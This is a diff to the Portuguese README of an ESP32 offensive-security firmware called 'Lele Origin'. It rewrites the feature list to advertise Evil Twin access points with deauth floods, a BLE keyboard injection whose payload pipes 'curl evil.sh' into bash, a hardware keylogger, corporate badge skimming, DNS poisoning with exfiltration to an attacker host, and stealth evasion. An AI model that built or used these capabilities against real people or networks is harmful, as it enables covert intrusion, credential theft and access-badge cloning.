@@ -1,29 +1,36 @@
-﻿# 🦎 Lele Origin 1.0
+﻿# 🦎 Lele Origin 1.0 - Arsenal Completo de Pentesting
 
 <p align="center">
-  <strong>Firmware versátil para ESP32 focado em operações de segurança ofensiva</strong>
+  <strong>Firmware ESP32 com arsenal completo de ferramentas de segurança ofensiva</strong>
 </p>
 
 ---
 
 ## 📋 Sobre
 
-O **Lele Origin** é um firmware ESP32 com múltiplas funcionalidades ofensivas para profissionais de segurança e entusiastas. Desenvolvido especificamente para a placa **CYD-2USB**.
+O **Lele Origin** é um firmware ESP32 com arsenal completo para operações de segurança ofensiva, incluindo ferramentas avançadas de pentesting. Badge Black Hat completo em um dispositivo ESP32.
 
-### ✨ Funcionalidades Principais
+### ✨ Arsenal Completo de Pentesting
 
 | Módulo | Recursos | Ataques |
 |--------|----------|---------|
-| 📡 **WiFi** | Scan, Evil Portal, Wardriving | 40 (CVE-2024, PMKID) |
-| 📶 **BLE** | Scan, spam, BrakTooth | 24 (4 combos) |
-| 🔌 **USB** | BadUSB, Payloads, HID | 10 |
-| 📻 **RF** | CC1101, NRF24, SubGhz | replay |
-| 💳 **RFID** | Leitura, clonagem, NDEF | - |
-| 📺 **IR** | TV-B-Gone, 40+ marcas | 1 |
-| 💡 **LEDs** | 16 efeitos WS2812B | - |
-| 🌡️ **Temp** | DS18B20, alertas | - |
+| 📡 **WiFi Evil Twin + Deauth** | Scan redes, AP fake SSID igual, WIFI_AP_STA, canal 6 fixo, beacon desaparecer em 1s, deauth floods bursts 10pkts/100ms via esp_wifi_80211_tx raw, pula WPA3 | Evil Twin + Deauth |
+| 📶 **BLE Keyboard Inject** | ESP32 como HID via NimBLE, pareia sem PIN, injeta Ctrl+Alt+Del + batch payload (curl evil.sh \| bash), despareia automaticamente | Rubber Ducky BLE |
+| 🔌 **UART Keylogger** | Leitura teclado matricial 5x5 via GPIO 27-31/32-36, debounce 5ms esp_intr_alloc, buffer circular 1K IRAM, AES criptografado SD keystroke.log, fallback NVS 128 bytes | Hardware Keylogger |
+| 💳 **NFC Skimmer** | PN532 SPI pins 5,18,19,23, lê MIFARE 1K sem chave (nested attack), copia UID + setores SD cartao_001_uid.dump, detecta badges corporativos | RFID Cloning |
+| 🔀 **Persistence** | DNS poisoning Evil Twin google.com -> attacker IP, HTTPS POST logs keylogger attacker:8443, ICMP tunneling firewall bypass | Backdoor Implants |
+| 🛡️ **Stealth Total** | Deep sleep 90%, wake timer/GPIO 0, LED blink código 0x1 ataque, MAC spoof random 5min esp_wifi_set_mac, no serial debug boot | Zero Detection |
+| 🚀 **Network Simulation** | ESP32 ultra-high performance: BLE 1000pkt/s Core1, WiFi 1200pkt/s Core0, UART DMA real-time, clock 160-240MHz ADC-monitored, berserk mode 240MHz ambos cores | Critical Network Sim |
 
-**Total: 75+ ataques implementados**
+**Total: 6 módulos especializados de pentesting implementados**
+
+### 🔒 Segurança & Core (Novidades v1.0)
+
+- **Aggressive SD Boot:** Wipe automático do flash interno a cada boot. Operação 100% via SD.
+- **Secure Boot (Paranoid Mode):** Verificação de integridade CRC32 e monitoramento térmico/voltagem.
+- **Zero-Trace:** Nenhuma configuração sensível salva na memória interna.
+- **Stealth Mode:** Deep sleep 90% uptime, MAC spoofing automático, LED signaling.
+- **Battery Optimizations:** 3 modos de energia (Economy 14d, Balanced 5d, Force 8h), ADC monitoring, deep sleep inteligente, logging de corrente.
 
 ---
 
@@ -36,6 +43,7 @@ esptool.py --port COM3 write_flash 0x00000 Lele-CYD-2USB.bin
 ```
 
 Ou compile seu próprio:
+
 ```bash
 pio run -e CYD-2USB -t upload
 ```
